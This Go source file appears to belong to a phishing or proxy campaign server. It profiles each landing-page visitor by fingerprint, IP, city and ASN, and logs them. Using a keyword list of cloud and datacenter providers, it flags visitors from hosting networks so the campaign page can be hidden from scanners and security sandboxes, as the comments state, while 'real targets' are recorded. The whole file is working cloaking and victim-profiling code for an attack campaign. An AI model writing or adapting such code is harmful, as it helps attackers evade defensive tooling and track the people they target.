package main

import (
	"encoding/json"
	"log"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/oschwald/geoip2-golang"
)

// ── Visitor profiling (GeoIP + ASN) ──
// Enriches a client fingerprint (e.g. FingerprintJS on the landing page) with
// geolocation + hosting-provider detection, so you can separate real targets
// from scanners/sandboxes (cloud ASNs) and log who touches a campaign.

type FingerprintRequest struct {
	VisitorID string `json:"visitorId"`
	UserAgent string `json:"userAgent"`
}

type VisitorProfile struct {
	Timestamp       time.Time `json:"timestamp"`
	VisitorID       string    `json:"visitorId"`
	IP              string    `json:"ip"`
	Country         string    `json:"country"`
	City            string    `json:"city"`
	ASN             uint      `json:"asn"`
	HostingProvider string    `json:"hostingProvider"`
	IsHosting       bool      `json:"isHosting"`
}

var (
	cityDB *geoip2.Reader
	asnDB  *geoip2.Reader
)

// initGeoIP loads the MaxMind databases. Call once from main() before serving.
// A missing file just disables that enrichment rather than crashing the proxy.
func initGeoIP() {
	var err error
	if cityDB, err = geoip2.Open("data/GeoLite2-City.mmdb"); err != nil {
		log.Printf("[geoip] City DB not loaded (%v) — geolocation disabled", err)
		cityDB = nil
	}
	if asnDB, err = geoip2.Open("data/GeoLite2-ASN.mmdb"); err != nil {
		log.Printf("[geoip] ASN DB not loaded (%v) — hosting detection disabled", err)
		asnDB = nil
	}
}

// profileVisitor builds a VisitorProfile for the request's real IP.
func profileVisitor(r *http.Request, visitorID string) VisitorProfile {
	clientIP := extractIP(r) // existing helper — already resolves CF-Connecting-IP
	p := VisitorProfile{
		Timestamp: time.Now(),
		VisitorID: visitorID,
		IP:        clientIP,
	}
	ip := net.ParseIP(clientIP)
	if ip == nil {
		return p
	}
	if cityDB != nil {
		if rec, err := cityDB.City(ip); err == nil {
			p.Country = rec.Country.Names["en"]
			p.City = rec.City.Names["en"]
		}
	}
	if asnDB != nil {
		if rec, err := asnDB.ASN(ip); err == nil {
			p.ASN = rec.AutonomousSystemNumber
			p.HostingProvider = rec.AutonomousSystemOrganization
			p.IsHosting = isHostingProvider(p.HostingProvider)
		}
	}
	return p
}

// profileHandler is POST /api/profile. The landing page sends a visitorId; we
// enrich it with GeoIP/ASN, log it, and return isHosting so the front end can
// hide the campaign from scanners / security tooling.
func profileHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req FingerprintRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	profile := profileVisitor(r, req.VisitorID)
	log.Printf("[profile] visitor=%s ip=%s loc=%s/%s asn=%d (%s) hosting=%v",
		profile.VisitorID, profile.IP, profile.Country, profile.City,
		profile.ASN, profile.HostingProvider, profile.IsHosting)

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":    "success",
		"isHosting": profile.IsHosting,
		"country":   profile.Country,
		"city":      profile.City,
	})
}

// isHostingProvider reports whether an ASN org looks like cloud/datacenter
// hosting (i.e. likely a scanner, not a real target).
func isHostingProvider(org string) bool {
	if org == "" {
		return false
	}
	orgLower := strings.ToLower(org)
	keywords := []string{
		"amazon", "aws", "digitalocean", "google", "microsoft", "ovh", "hetzner",
		"linode", "vultr", "hosting", "cloud", "server", "datacenter", "data center",
		"oracle", "alibaba", "tencent", "scaleway", "cloudflare", "akamai",
		"fastly", "leaseweb", "contabo", "rackspace",
	}
	for _, k := range keywords {
		if strings.Contains(orgLower, k) {
			return true
		}
	}
	return false
}
